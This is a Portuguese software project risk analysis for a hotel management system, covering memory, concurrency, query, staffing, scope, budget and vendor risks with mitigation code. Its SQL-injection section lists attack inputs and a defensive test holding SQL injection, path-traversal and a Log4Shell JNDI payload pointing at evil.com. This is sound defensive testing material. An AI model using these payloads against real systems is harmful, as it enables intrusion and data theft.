# Análise de Riscos - Sistema de Gestão Hotelaria

## 📊 Matriz de Riscos

```text
                    IMPACTO
                    │
         CRÍTICO    │  R1   R3   R8
                    │  R12  R17  R23
                    │
         ALTO       │  R2   R5   R10
                    │  R15  R19  R24
                    │
         MÉDIO      │  R4   R7   R11
                    │  R14  R20  R25
                    │
         BAIXO      │  R6   R9   R13
                    │  R16  R21  R22
                    │
                    └─────────────────────► PROBABILIDADE
                      BAIXA  MÉDIA  ALTA

```

---

## 🔴 RISCOS TÉCNICOS

### R1: OutOfMemoryError em Produção 🔴🔴🔴

* **Categoria:** Performance/Infraestrutura
* **Probabilidade:** Média (40%)
* **Impacto:** CRÍTICO
* **Score de Risco:** 🔴 9/10

**Descrição**
Sistema pode ficar sem memória ao processar grandes volumes de dados (ex: listar 50.000 hóspedes sem paginação).

**Causas Raiz**

* Falta de paginação nas listagens
* Cache sem limite de tamanho
* Connection pool mal configurado
* Memory leak em objetos não liberados
* Queries com JOIN complexos carregando muitos dados

**Sinais de Alerta (Early Warning)**

* ⚠️ **Alertas Prometheus:**
* `jvm_memory_used_bytes > 85%` por 5 minutos
* `jvm_gc_pause_seconds > 1s` (Full GC frequente)
* `hikaricp_connections_active` próximo do max


* ⚠️ **Logs:**
* "OutOfMemoryError" em logs de aplicação
* "Slow query" com result sets > 10.000 rows
* Thread dump mostrando threads blocked



**Impacto no Negócio**

* ⏱️ **Downtime:** 15-60 minutos
* 💰 **Custo:** R$ 5.000 - R$ 20.000 (perda de reservas)
* 😡 **UX:** Usuários não conseguem acessar sistema
* 📉 **Reputação:** Clientes migram para concorrentes

**Plano de Mitigação**

*Preventivo (Antes de Acontecer)*

```java
// 1. IMPLEMENTAR PAGINAÇÃO OBRIGATÓRIA
@GetMapping("/api/v1/hospedes")
public ResponseEntity<Page<HospedeDTO>> listar(
    @PageableDefault(size = 20, page = 0) Pageable pageable) {
    
    // Limitar tamanho máximo da página
    if (pageable.getPageSize() > 100) {
        pageable = PageRequest.of(
            pageable.getPageNumber(), 
            100, 
            pageable.getSort()
        );
    }
    
    return ResponseEntity.ok(hospedeService.listar(pageable));
}

// 2. CONFIGURAR CACHE COM LIMITE
@Bean
public CacheManager cacheManager() {
    CaffeineCacheManager cacheManager = new CaffeineCacheManager();
    cacheManager.setCaffeine(Caffeine.newBuilder()
        .maximumSize(10_000)              // ✅ Limite de 10k entradas
        .expireAfterWrite(10, MINUTES)     // ✅ Expiração
        .recordStats());                   // ✅ Métricas
    return cacheManager;
}

// 3. CONFIGURAR HEAP COM MARGEM DE SEGURANÇA
// application-prod.properties
-Xmx2g              # Max heap 2GB
-Xms1g              # Min heap 1GB (50% do max)
-XX:+UseG1GC        # Garbage collector eficiente
-XX:MaxGCPauseMillis=200  # GC pause target

```

*Monitoramento Proativo*

```yaml
# prometheus/alerts.yml
- alert: HighMemoryUsage
  expr: (jvm_memory_used_bytes{area="heap"} / jvm_memory_max_bytes{area="heap"}) * 100 > 85
  for: 5m
  labels:
    severity: warning
  annotations:
    summary: "Memória JVM alta: {{ $value }}%"
    runbook: "[https://wiki.hotel.com/runbook/rb-004](https://wiki.hotel.com/runbook/rb-004)"

- alert: CriticalMemoryUsage
  expr: (jvm_memory_used_bytes{area="heap"} / jvm_memory_max_bytes{area="heap"}) * 100 > 95
  for: 2m
  labels:
    severity: critical
  annotations:
    summary: "Memória JVM CRÍTICA: {{ $value }}%"
    action: "Executar restart imediato"

```

*Contingência (Quando Acontece)*

```bash
#!/bin/bash
# scripts/oom-recovery.sh

# 1. Capturar heap dump (se possível - app pode estar travado)
jmap -dump:live,format=b,file=/tmp/oom-$(date +%s).hprof $(pgrep java)

# 2. Remover instância do load balancer
aws elbv2 deregister-targets \
  --target-group-arn $TG_ARN \
  --targets Id=$INSTANCE_ID

# 3. Restart da aplicação
sudo systemctl restart hotel-gestao

# 4. Aguardar health check
for i in {1..30}; do
  if curl -f http://localhost:8080/actuator/health; then
    echo "App voltou ao normal"
    break
  fi
  sleep 5
done

# 5. Re-adicionar ao load balancer
aws elbv2 register-targets \
  --target-group-arn $TG_ARN \
  --targets Id=$INSTANCE_ID

# 6. Analisar heap dump offline (Eclipse MAT)
# 7. Criar issue para root cause analysis

```

**KPIs de Sucesso**

| Métrica | Antes | Meta Pós-Mitigação |
| --- | --- | --- |
| Uso médio de heap | 85% | < 70% |
| Full GC por hora | 10+ | < 2 |
| Incidentes OOM/mês | 1-2 | 0 |
| Tempo de recovery | 30min | < 5min (auto-restart) |

**Responsável**

* **Dono:** Backend Tech Lead
* **Apoio:** DevOps, SRE
* **Revisão:** Semanal (Sprint 3)

---

### R2: SQL Injection via Path Parameters 🔴🔴

* **Categoria:** Segurança
* **Probabilidade:** Média (30%)
* **Impacto:** CRÍTICO
* **Score de Risco:** 🔴 8/10

**Descrição**
Entrada não validada em path parameters pode permitir SQL injection.

**Exemplo de Vulnerabilidade**

```java
// ❌ CÓDIGO VULNERÁVEL (hipotético)
@GetMapping("/cpf/{cpf}")
public ResponseEntity<HospedeDTO> buscar(@PathVariable String cpf) {
    // Se usar SQL nativo sem prepared statement
    String sql = "SELECT * FROM hospedes WHERE cpf = '" + cpf + "'";
    // cpf = "123' OR '1'='1" → SQL injection!
}

```

**Vetores de Ataque**

1. **Path Injection:**
`GET /api/hospedes/cpf/123' OR '1'='1`
2. **NoSQL Injection (se usar MongoDB):**
`GET /api/hospedes/cpf/{"$ne":null}`
3. **Command Injection:**
`GET /api/hospedes/cpf/123; DROP TABLE hospedes;--`

**Plano de Mitigação**

*Código Seguro*

```java
// ✅ CÓDIGO SEGURO
@GetMapping("/cpf/{cpf}")
public ResponseEntity<HospedeDTO> buscarPorCpf(
    @PathVariable 
    @Pattern(regexp = "\\d{11}", message = "CPF inválido") // ✅ Validação
    String cpf) {
    
    // ✅ Sanitização
    String cpfSanitizado = cpf.replaceAll("\\D", "");
    
    // ✅ JPA usa prepared statements automaticamente
    Hospede hospede = hospedeRepository.findByCpf(cpfSanitizado)
        .orElseThrow(() -> new ResourceNotFoundException("..."));
    
    return ResponseEntity.ok(mapToDTO(hospede));
}

// ✅ Repository (JPA - safe)
public interface HospedeRepository extends JpaRepository<Hospede, UUID> {
    Optional<Hospede> findByCpf(String cpf); // Prepared statement automático
}

```

*Testes de Segurança*

```java
@Test
@DisplayName("Deve rejeitar SQL injection em CPF")
void deveRejeitarSqlInjectionEmCpf() {
    String[] payloads = {
        "123' OR '1'='1",
        "123; DROP TABLE hospedes;--",
        "123' UNION SELECT * FROM users--",
        "../../../etc/passwd",
        "${jndi:ldap://[evil.com/a](https://evil.com/a)}" // Log4Shell
    };
    
    for (String payload : payloads) {
        mockMvc.perform(get("/api/v1/hospedes/cpf/" + payload))
            .andExpect(status().isBadRequest()) // ✅ Deve rejeitar
            .andExpect(jsonPath("$.message")
                .value(containsString("CPF inválido")));
    }
}

```

*SAST (Static Analysis)*

```yaml
# .github/workflows/security.yml
- name: OWASP Dependency Check
  run: mvn org.owasp:dependency-check-maven:check

- name: Snyk Security Scan
  run: snyk test --severity-threshold=high

- name: SonarQube Security Hotspots
  run: mvn sonar:sonar -Dsonar.login=$SONAR_TOKEN

```

**Responsável**

* **Dono:** Security Lead
* **Validação:** Penetration Test (Sprint 5)

---

### R3: Deadlock em Transações Concorrentes 🔴🔴🔴

* **Categoria:** Concorrência/Database
* **Probabilidade:** Baixa (15%)
* **Impacto:** CRÍTICO
* **Score de Risco:** 🔴 7/10

**Descrição**
Múltiplas transações tentando reservar o mesmo quarto simultaneamente podem causar deadlock.

**Cenário de Deadlock**

| Tempo | Transação A (User 1) | Transação B (User 2) |
| --- | --- | --- |
| **t0** | BEGIN TRANSACTION | BEGIN TRANSACTION |
| **t1** | SELECT quarto WHERE id=101 | SELECT quarto WHERE id=101 |
| **t2** | (status = DISPONIVEL ✅) | (status = DISPONIVEL ✅) |
| **t3** | UPDATE quarto SET status=OCUPADO WHERE id=101 [WAITING...] | UPDATE quarto SET status=OCUPADO WHERE id=101 [WAITING...] |
| **t4** | ⏸️ **DEADLOCK!** | ⏸️ **DEADLOCK!** |

**Plano de Mitigação**

*Solução 1: Lock Pessimista*

```java
@Repository
public interface QuartoRepository extends JpaRepository<Quarto, Long> {
    
    @Lock(LockModeType.PESSIMISTIC_WRITE)
    @Query("SELECT q FROM Quarto q WHERE q.id = :id")
    Optional<Quarto> findByIdForUpdate(@Param("id") Long id);
}

@Service
public class ReservaService {
    
    @Transactional
    public ReservaDTO criar(ReservaDTO dto) {
        // ✅ Lock pessimista: segunda transação espera
        Quarto quarto = quartoRepository.findByIdForUpdate(dto.getQuartoId())
            .orElseThrow(() -> new ResourceNotFoundException("..."));
        
        if (quarto.getStatus() != StatusQuarto.DISPONIVEL) {
            throw new BusinessException("Quarto não disponível");
        }
        
        // Atualizar status
        quarto.setStatus(StatusQuarto.OCUPADO);
        quartoRepository.save(quarto);
        
        // Criar reserva
        // ...
        
        return mapToDTO(reserva);
    }
}

```

*Solução 2: Lock Otimista (@Version)*

```java
@Entity
@Table(name = "quartos")
public class Quarto {
    
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Version // ✅ Lock otimista
    private Long version;
    
    @Enumerated(EnumType.STRING)
    private StatusQuarto status;
    
    // ... getters/setters
}

@Service
public class ReservaService {
    
    @Transactional
    @Retryable(
        value = OptimisticLockException.class,
        maxAttempts = 3,
        backoff = @Backoff(delay = 100)
    )
    public ReservaDTO criar(ReservaDTO dto) {
        Quarto quarto = quartoRepository.findById(dto.getQuartoId())
            .orElseThrow(() -> new ResourceNotFoundException("..."));
        
        if (quarto.getStatus() != StatusQuarto.DISPONIVEL) {
            throw new BusinessException("Quarto não disponível");
        }
        
        // Version é automaticamente verificada no save()
        quarto.setStatus(StatusQuarto.OCUPADO);
        quartoRepository.save(quarto); // Throws OptimisticLockException se version mudou
        
        // ...
    }
}

```

*Solução 3: Distributed Lock (Redis)*

```java
@Service
public class ReservaService {
    
    private final RedissonClient redissonClient;
    
    @Transactional
    public ReservaDTO criar(ReservaDTO dto) {
        String lockKey = "quarto:lock:" + dto.getQuartoId();
        RLock lock = redissonClient.getLock(lockKey);
        
        try {
            // ✅ Distributed lock com timeout
            boolean acquired = lock.tryLock(5, 10, TimeUnit.SECONDS);
            
            if (!acquired) {
                throw new BusinessException("Quarto está sendo reservado. Tente novamente.");
            }
            
            // Lógica de reserva...
            
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new BusinessException("Reserva interrompida");
        } finally {
            if (lock.isHeldByCurrentThread()) {
                lock.unlock();
            }
        }
    }
}

```

*Monitoramento de Deadlocks*

```sql
-- PostgreSQL: Ver deadlocks
SELECT 
    pid,
    usename,
    pg_blocking_pids(pid) AS blocked_by,
    query
FROM pg_stat_activity
WHERE cardinality(pg_blocking_pids(pid)) > 0;

-- Ver locks ativos
SELECT 
    locktype, 
    relation::regclass, 
    mode, 
    transactionid, 
    pid 
FROM pg_locks;

```

```yaml
# prometheus/alerts.yml
- alert: DatabaseDeadlock
  expr: increase(database_deadlocks_total[5m]) > 0
  labels:
    severity: critical
  annotations:
    summary: "Deadlock detectado no banco de dados"

```

*Testes de Concorrência*

```java
@Test
@DisplayName("Deve prevenir dupla reserva do mesmo quarto")
void devePrevenirDuplaReserva() throws Exception {
    Long quartoId = 1L;
    int numThreads = 10;
    
    ExecutorService executor = Executors.newFixedThreadPool(numThreads);
    CountDownLatch latch = new CountDownLatch(numThreads);
    
    AtomicInteger sucessos = new AtomicInteger(0);
    AtomicInteger falhas = new AtomicInteger(0);
    
    // 10 threads tentam reservar o mesmo quarto simultaneamente
    for (int i = 0; i < numThreads; i++) {
        executor.submit(() -> {
            try {
                latch.countDown();
                latch.await(); // Sincronizar início
                
                ReservaDTO dto = criarReservaDTO(quartoId);
                reservaService.criar(dto);
                sucessos.incrementAndGet();
                
            } catch (BusinessException e) {
                // Esperado: "Quarto não disponível"
                falhas.incrementAndGet();
            } catch (Exception e) {
                fail("Exceção inesperada: " + e);
            }
        });
    }
    
    executor.shutdown();
    executor.awaitTermination(30, TimeUnit.SECONDS);
    
    // ✅ Apenas 1 deve ter sucesso
    assertThat(sucessos.get()).isEqualTo(1);
    assertThat(falhas.get()).isEqualTo(9);
}

```

**Responsável**

* **Dono:** Backend Senior Developer
* **Validação:** Testes de carga (Sprint 5)

---

### R4: Degradação de Performance em Queries N+1 🟡

* **Categoria:** Performance
* **Probabilidade:** Alta (60%)
* **Impacto:** MÉDIO
* **Score de Risco:** 🟡 6/10

**Descrição**
Queries JPA lazy loading podem causar problema N+1 (1 query inicial + N queries para cada relacionamento).

**Exemplo do Problema**

```java
// ❌ PROBLEMA N+1
@GetMapping("/api/v1/reservas")
public List<ReservaDTO> listar() {
    List<Reserva> reservas = reservaRepository.findAll(); // 1 query
    
    return reservas.stream()
        .map(r -> {
            // Para cada reserva:
            String nomeHospede = r.getHospede().getNome();    // +1 query
            String numeroQuarto = r.getQuarto().getNumero(); // +1 query
            return mapToDTO(r);
        })
        .collect(toList());
    
    // Se tiver 100 reservas → 1 + 100 + 100 = 201 queries! 😱
}

```

**Plano de Mitigação**

```java
// ✅ SOLUÇÃO 1: JOIN FETCH
@Repository
public interface ReservaRepository extends JpaRepository<Reserva, Long> {
    
    @Query("SELECT r FROM Reserva r " +
           "JOIN FETCH r.hospede " +
           "JOIN FETCH r.quarto")
    List<Reserva> findAllWithRelations();
}

// ✅ SOLUÇÃO 2: @EntityGraph
@Repository
public interface ReservaRepository extends JpaRepository<Reserva, Long> {
    
    @EntityGraph(attributePaths = {"hospede", "quarto"})
    List<Reserva> findAll();
}

// ✅ SOLUÇÃO 3: Projeção (DTO direto)
@Query("SELECT new com.hotel.dto.ReservaDTO(" +
       "r.id, r.dataEntrada, r.dataSaida, " +
       "h.nome, q.numero, r.valorTotal) " +
       "FROM Reserva r " +
       "JOIN r.hospede h " +
       "JOIN r.quarto q")
List<ReservaDTO> findAllProjection();

```

*Monitoramento*

```properties
# application.properties (dev/staging)
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.format_sql=true
spring.jpa.properties.hibernate.use_sql_comments=true

# Detectar N+1
logging.level.org.hibernate.SQL=DEBUG
logging.level.org.hibernate.type.descriptor.sql.BasicBinder=TRACE

```

```java
// Teste automatizado
@Test
void deveEvitarNPlusUm() {
    // Ativar contador de queries
    QueryCountHolder.clear();
    
    List<ReservaDTO> reservas = reservaService.listarTodos();
    
    long queries = QueryCountHolder.getGrandTotal().getTotal();
    
    // ✅ Deve executar no máximo 3 queries (com JOIN FETCH)
    assertThat(queries).isLessThanOrEqualTo(3);
}

```

**Responsável**

* **Dono:** Backend Pleno Developer
* **Sprint:** 3 (Performance)

---

## 📋 RISCOS GERENCIAIS

### R10: Saída de Membro-Chave do Time 🔴🔴

* **Categoria:** Pessoas
* **Probabilidade:** Média (30%)
* **Impacto:** ALTO
* **Score de Risco:** 🔴 7/10

**Descrição**
Perda de conhecimento crítico se Backend Senior Developer sair no meio do projeto.

**Impacto**
SE Backend Senior sair:
ENTÃO:
• Velocity cai 40% (de 95 pts → 57 pts)
• Conhecimento de arquitetura perdido
• Decisões técnicas atrasam
• Sprint 1-3 em risco (segurança, CRUD, performance)

**Plano de Mitigação**

*Preventivo*

## Knowledge Transfer Plan

### Documentação Obrigatória (Cada Sprint):

* [ ] Decisões arquiteturais (ADRs)
* [ ] Diagramas de sequência (flows críticos)
* [ ] README atualizado
* [ ] Runbooks completos

### Pair Programming:

* Backend Senior + Backend Pleno: 40% do tempo
* Rotação de ownership de features

### Bus Factor = 2 mínimo:

* Toda feature crítica deve ter 2+ devs que conhecem

### Gravações:

* Sessions de design review gravadas
* Code review com explicações gravadas

*Contingência*

* **DIA 1 (Saída confirmada):**
[ ] Agendar knowledge transfer (3 sessões de 2h)
[ ] Documentar conhecimento tácito
[ ] Transferir ownership de features
* **DIA 2-5:**
[ ] Handover completo
[ ] Pair programming intensivo
[ ] Documentação de gaps
* **DIA 6-10:**
[ ] Re-priorizar backlog (focar Must Have)
[ ] Reduzir velocity em 40%
[ ] Contratar substituição (2-4 semanas)
* **SEMANA 3+:**
[ ] Onboarding de substituição
[ ] Retomar velocity gradualmente

**KPIs de Mitigação**

| Métrica | Target |
| --- | --- |
| **Bus Factor** | ≥ 2 para features críticas |
| **Documentação** | 100% de decisões em ADRs |
| **Knowledge Silos** | < 20% (medido em code ownership) |

**Responsável**

* **Dono:** Engineering Manager
* **Revisão:** Bi-semanal

---

### R11: Scope Creep (Aumento de Escopo) 🟡🟡

* **Categoria:** Escopo
* **Probabilidade:** Alta (70%)
* **Impacto:** MÉDIO
* **Score de Risco:** 🟡 7/10

**Descrição**
Stakeholders adicionam features não planejadas durante o desenvolvimento, aumentando escopo e atrasando entrega.

**Sinais de Alerta**

* ⚠️  "Já que você está fazendo X, que tal adicionar Y também?"
* ⚠️  "É só um campinho a mais, deve ser rápido"
* ⚠️  "O concorrente tem essa feature, precisamos também"
* ⚠️  "Mudança de última hora no layout"

**Exemplos Reais**

* **SPRINT 2 - Planejado:**
• CRUD de Hóspedes (8 pts)
* **SPRINT 2 - Real:**
• CRUD de Hóspedes (8 pts)
• ➕ "Adicionar foto do hóspede" (5 pts) ← Scope creep
• ➕ "Histórico de alterações" (8 pts) ← Scope creep
• ➕ "Exportar para Excel" (5 pts) ← Scope creep
* **Resultado:** Sprint incompleto, rollover para Sprint 3

**Plano de Mitigação**

*Preventivo*

## Change Request Process

### QUALQUER mudança de escopo deve passar por:

1. ✅ **DOCUMENTO FORMAL:**
* Título da feature
* Justificativa de negócio
* Impacto em timeline
* Aprovação PO + Tech Lead


2. ✅ **ESTIMATIVA:**
* Story points
* Dependências
* Risco


3. ✅ **TRADE-OFF:**
SE adicionar feature X (8 pts):
ENTÃO remover feature Y (8 pts)
Ou aceitar atraso de 1 sprint
4. ✅ **APROVAÇÃO EXECUTIVA:**
* Mudanças > 20 pts requerem C-level approval



*Bloqueios de Escopo*

```text
┌─────────────────────────────────────────────────────────┐
│              SCOPE FREEZE PERIODS                        │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Sprint 0-1:  ✅ Mudanças permitidas (planejamento)    │
│  Sprint 2-3:  ⚠️  Apenas bugs críticos                 │
│  Sprint 4-6:  🔒 FREEZE (preparação para UAT)          │
│  Sprint 7:    🔒 FREEZE TOTAL (go-live)                │
│                                                          │
└─────────────────────────────────────────────────────────┘

```

*Comunicação com Stakeholders*

```text
# Email Template - Rejeição de Scope Creep

Assunto: Re: Solicitação de Feature X

Olá [Stakeholder],

Obrigado pela sugestão da feature "X". Entendemos a importância.

**Análise de Impacto:**
• Esforço estimado: 13 story points (~26 horas)
• Dependências: Backend + Frontend + DB migration
• Risco: Médio (nova integração com sistema Y)

**Opções:**

1. ✅ ADICIONAR À ROADMAP v1.1 (pós-lançamento)
   • Timeline: 2 semanas após go-live
   • Sem impacto na data de lançamento

2. ⚠️  ADICIONAR AGORA (trocar por feature Y)
   • Remover: "Exportação de relatórios" (13 pts)
   • Atraso: +1 sprint na entrega

3. ❌ NÃO FAZER (se não é Must Have)

**Recomendação do Time:** Opção 1

Aguardamos sua decisão até [data].

Att,
Tech Lead

```

**Métricas de Controle**
*Velocity Planejado vs Real:*

| Sprint | Planejado | Real | Scope Creep | Status |
| --- | --- | --- | --- | --- |
| **S1** | 45 pts | 45 pts | 0 pts | ✅ OK |
| **S2** | 65 pts | 91 pts | +26 pts | 🔴 CREEP |
| **S3** | 60 pts | 62 pts | +2 pts | ⚠️  LEVE |

**Responsável**

* **Dono:** Product Owner
* **Apoio:** Tech Lead (estimativas)
* **Escalação:** Engineering Manager

---

### R12: Orçamento Excedido 🔴🔴🔴

* **Categoria:** Financeiro
* **Probabilidade:** Média (40%)
* **Impacto:** CRÍTICO
* **Score de Risco:** 🔴 8/10

**Descrição**
Projeto ultrapassa orçamento aprovado devido a imprevistos, mudanças de escopo ou subestimação.

**Orçamento Inicial**

```text
┌─────────────────────────────────────────────────────────┐
│                  ORÇAMENTO APROVADO                      │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Recursos Humanos:                                      │
│    • Backend Senior (900h × R$ 250/h)    R$ 225.000    │
│    • Backend Pleno (900h × R$ 150/h)     R$ 135.000    │
│    • QA Engineer (450h × R$ 120/h)       R$ 54.000     │
│    • DevOps (300h × R$ 200/h)            R$ 60.000     │
│                                                          │
│  Infraestrutura (15 semanas):                           │
│    • AWS (EC2, RDS, S3, CloudWatch)      R$ 15.000     │
│    • Ferramentas (Jira, Confluence)      R$ 3.000      │
│                                                          │
│  Contingência (15%):                     R$ 74.100     │
│                                                          │
│  TOTAL:                                  R$ 566.100    │
│                                                          │
└─────────────────────────────────────────────────────────┘

```

**Causas de Estouro**

| Causa | Probabilidade | Impacto $ | Prevenção |
| --- | --- | --- | --- |
| Scope creep não controlado | 70%+ | R$ 100k | Change control process |
| Estimativas otimistas | 50%+ | R$ 50k | Buffer de 20% |
| Bugs críticos em produção | 30%+ | R$ 30k | Testes automatizados |
| Saída de membro do time | 30%+ | R$ 80k | Knowledge transfer |
| Infraestrutura subestimada | 20%+ | R$ 20k | PoC de infra antes |

**Monitoramento de Budget**

```python
# budget_tracker.py (executar semanalmente)

budget = {
    'total': 566100,
    'spent': 0,
    'committed': 0,
    'remaining': 566100
}

def track_sprint(sprint_num, actual_hours):
    cost_per_hour = {
        'backend_sr': 250,
        'backend_pl': 150,
        'qa': 120,
        'devops': 200
    }
    
    sprint_cost = sum(hours * cost_per_hour[role] 
                      for role, hours in actual_hours.items())
    
    budget['spent'] += sprint_cost
    budget['remaining'] = budget['total'] - budget['spent']
    
    burn_rate = budget['spent'] / sprint_num
    projected_total = burn_rate * 7  # 7 sprints
    
    if projected_total > budget['total']:
        alert(f"⚠️  BUDGET OVERRUN PROJETADO: R$ {projected_total:,.2f}")
        alert(f"   Estouro estimado: R$ {projected_total - budget['total']:,.2f}")
    
    return {
        'spent': budget['spent'],
        'remaining': budget['remaining'],
        'burn_rate': burn_rate,
        'projected': projected_total
    }

# Exemplo Sprint 2:
track_sprint(2, {
    'backend_sr': 160,  # 80h planejado, mas levou 160h (scope creep)
    'backend_pl': 120,
    'qa': 60,
    'devops': 40
})

# Output:
# ⚠️  BUDGET OVERRUN PROJETADO: R$ 622.770
#    Estouro estimado: R$ 56.670

```

**Dashboard de Budget**
SEMANA 8 (Sprint 4):

```text
┌─────────────────────────────────────────────────────────┐
│              BUDGET BURN-DOWN                            │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Budget Total:      R$ 566.100                          │
│  Gasto até agora:   R$ 320.000 (57%)                    │
│  Comprometido:      R$ 80.000  (15%)                    │
│  Disponível:        R$ 166.100 (28%)                    │
│                                                          │
│  Progresso: 57% do tempo (Sprint 4/7)                   │
│  Projeção:  R$ 622.770 (110% do budget) 🔴             │
│                                                          │
│  STATUS: ⚠️  EM RISCO DE ESTOURO                        │
│                                                          │
└─────────────────────────────────────────────────────────┘

```

**AÇÕES RECOMENDADAS:**

1. Congelar scope (Sprint 5-7)
2. Reduzir horas de QA em 20%
3. Mover "Could Have" para v1.1
4. Solicitar aprovação de budget adicional de R$ 60k

**Plano de Contingência**

* **SE budget atingir 85%:**
ENTÃO:
[ ] Freeze de scope imediato
[ ] Review de todas features "Should Have"
[ ] Reduzir horas de DevOps (usar templates)
[ ] Pré-aprovar 10% de budget adicional
* **SE budget atingir 95%:**
ENTÃO:
[ ] Cancelar todas features "Could Have"
[ ] Reduzir equipe (QA para 20h/semana)
[ ] Negociar atraso de 1 sprint com stakeholders
[ ] Aprovar budget adicional de 15%
* **SE budget estorar:**
ENTÃO:
[ ] Paralisar desenvolvimento
[ ] Reunião emergencial com CFO
[ ] Decidir: aprovar budget ou reduzir escopo

**Responsável**

* **Dono:** Project Manager / PO
* **Revisão:** Semanal (toda segunda-feira)
* **Escalação:** CFO (se projeção > 105%)

---

### R15: Dependência de Fornecedores Externos 🔴

* **Categoria:** Dependências
* **Probabilidade:** Média (35%)
* **Impacto:** ALTO
* **Score de Risco:** 🟡 6/10

**Descrição**
Projeto depende de serviços externos (AWS, GitHub, SonarQube, etc.) que podem ter indisponibilidade ou mudanças de preço.

**Dependências Críticas**

| Serviço | Função | SLA | Impacto se Cair |
| --- | --- | --- | --- |
| AWS RDS | Database | 99.95% | 🔴 Sistema totalmente down |
| AWS ALB | Load Balancer | 99.99% | 🔴 Sistema inacessível |
| GitHub | CI/CD | 99.9% | 🟡 Não consegue fazer deploy |
| Docker Hub | Container registry | 99.5% | 🟡 Não consegue fazer deploy |
| SonarQube | Code quality | - | 🟢 Não bloqueia deploy |

**Plano de Mitigação**

*Multi-Cloud / Redundância*

```text
# Redundância de serviços críticos

Primary: AWS (us-east-1)
Failover: AWS (us-west-2) [outro AZ]

Container Registry:
  Primary: Docker Hub
  Fallback: AWS ECR, GitHub Container Registry

CI/CD:
  Primary: GitHub Actions
  Fallback: GitLab CI (self-hosted)

```

*Disaster Recovery*

```bash
#!/bin/bash
# scripts/failover-to-west.sh

# 1. Backup do DB (ponto-in-time)
aws rds create-db-snapshot \
  --db-instance-identifier hotel-db-master \
  --db-snapshot-identifier failover-$(date +%s)

# 2. Restaurar em outra região
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier hotel-db-west \
  --db-snapshot-identifier failover-123456 \
  --region us-west-2

# 3. Atualizar DNS (Route53)
aws route53 change-resource-record-sets \
  --hosted-zone-id Z123456 \
  --change-batch file://dns-failover.json

# 4. Atualizar connection strings
kubectl set env deployment/hotel-backend \
  DB_HOST=hotel-db-west.us-west-2.rds.amazonaws.com

```

*Vendor Lock-in Mitigation*
Evitar Lock-in da AWS:
✅ Usar Kubernetes (portável entre clouds)
✅ Database: PostgreSQL (não Aurora - AWS-specific)
✅ Storage: MinIO compatible (S3-compatible, mas portável)
✅ Logs: Loki (não CloudWatch exclusivo)
✅ Métricas: Prometheus (não só CloudWatch)

SE precisar migrar para Google Cloud:
ENTÃO mudanças mínimas (K8s manifests são portáveis)

**Responsável**

* **Dono:** DevOps Lead
* **Teste de Failover:** Trimestral

---

## 📊 Matriz Completa de Riscos

| ID | Risco | Categoria | Prob. | Impacto | Score | Dono | Sprint |
| --- | --- | --- | --- | --- | --- | --- | --- |
| **R1** | OutOfMemoryError | Técnico | M | Crítico | 🔴 9 | Backend Sr | S3 |
| **R2** | SQL Injection | Segurança | M | Crítico | 🔴 8 | Security | S1 |
| **R3** | Deadlock DB | Técnico | B | Crítico | 🔴 7 | Backend Sr | S2 |
| **R4** | N+1 Queries | Performance | A | Médio | 🟡 6 | Backend Pl | S3 |
| **R5** | Dados sensíveis em logs | Segurança | A | Alto | 🔴 7 | Backend Sr | S4 |
| **R6** | Cache sem eviction | Técnico | B | Médio | 🟢 4 | Backend Pl | S3 |
| **R7** | Migrations quebradas | DevOps | M | Médio | 🟡 5 | DevOps | S6 |
| **R8** | Vazamento de secrets | Segurança | B | Crítico | 🔴 7 | DevOps | S1 |
| **R9** | Testes flaky | Qualidade | M | Baixo | 🟢 3 | QA | S5 |
| **R10** | Saída de dev | Pessoas | M | Alto | 🔴 7 | EM | Contínuo |
| **R11** | Scope creep | Escopo | A | Médio | 🟡 7 | PO | Contínuo |
| **R12** | Estouro de budget | Financeiro | M | Crítico | 🔴 8 | PM | Contínuo |
| **R13** | Comunicação falha | Processo | M | Baixo | 🟢 3 | SM | Contínuo |
| **R14** | Rollback falha | DevOps | B | Médio | 🟡 5 | DevOps | S6 |
| **R15** | Vendor lock-in | Dependência | M | Alto | 🟡 6 | DevOps | S0 |
| **R16** | Onboarding lento | Pessoas | M | Baixo | 🟢 3 | EM | Contínuo |
| **R17** | Dados inconsistentes | Qualidade | B | Crítico | 🔴 7 | Backend Sr | S5 |
| **R18** | Falta de documentação | Processo | A | Médio | 🟡 6 | Todos | S7 |
| **R19** | UAT não aprovado | Negócio | M | Alto | 🟡 6 | PO | S7 |
| **R20** | Performance em prod | Técnico | M | Médio | 🟡 5 | Backend Sr | S4 |
| **R21** | Timezone bugs | Técnico | M | Baixo | 🟢 3 | Backend Pl | S2 |
| **R22** | Browser compatibility | Frontend | B | Baixo | 🟢 2 | Frontend | - |
| **R23** | LGPD compliance | Legal | B | Crítico | 🔴 7 | Legal + Tech | S1 |
| **R24** | Disaster recovery | Infra | B | Alto | 🟡 6 | DevOps | S6 |
| **R25** | Tech debt acumulado | Técnico | M | Médio | 🟡 5 | Tech Lead | S5 |

## 🎯 Risk Response Strategy

*Estratégia por Categoria*

```text
┌─────────────────────────────────────────────────────────┐
│              ESTRATÉGIAS DE RESPOSTA                     │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  EVITAR (Avoid):                                        │
│    • R2 - SQL Injection → Validação rigorosa           │
│    • R8 - Secrets exposure → AWS Secrets Manager       │
│                                                          │
│  TRANSFERIR (Transfer):                                 │
│    • R15 - Vendor lock-in → Multi-cloud strategy       │
│    • R24 - DR → AWS managed services (SLA 99.95%)      │
│                                                          │
│  MITIGAR (Mitigate):                                    │
│    • R1 - OOM → Paginação + monitoramento              │
│    • R11 - Scope creep → Change control                │
│    • R12 - Budget → Weekly tracking                    │
│                                                          │
│  ACEITAR (Accept):                                      │
│    • R9 - Testes flaky → Retry até 3x                  │
│    • R21 - Timezone → UTC everywhere (documentado)     │
│                                                          │
└─────────────────────────────────────────────────────────┘

```

## 📈 Risk Burn-down

```text
Risk Exposure (Score × Probabilidade)

180 │●
    │ ╲
160 │  ●
    │   ╲
140 │    ●
    │     ╲
120 │      ●
    │       ╲___
100 │           ●─────
    │                 ●
 80 │                  ●
    │                   ●_____
 60 │________________________●
    │
  0 └─────────────────────────────────► Sprint
